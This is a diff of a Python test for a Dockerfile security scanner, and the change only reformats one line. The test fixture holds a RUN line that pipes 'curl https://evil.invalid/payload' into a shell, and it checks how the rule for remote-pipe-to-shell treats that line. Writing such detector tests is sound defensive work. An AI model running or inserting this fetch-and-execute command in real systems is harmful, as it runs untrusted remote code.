@@ -150,9 +150,7 @@ def test_scan_tree_allows_non_combined_rm_cleanup(tmp_path: Path, command: str) 
 )
 def test_scan_tree_stops_env_option_parsing_at_command(tmp_path: Path, shell: str) -> None:
     dockerfile = tmp_path / "Dockerfile"
-    dockerfile.write_text(
-        f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n"
-    )
+    dockerfile.write_text(f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n")
     assert not any(finding.rule == "SEC_SHELL_REMOTE_PIPE" for finding in scan_tree(tmp_path))
 
 
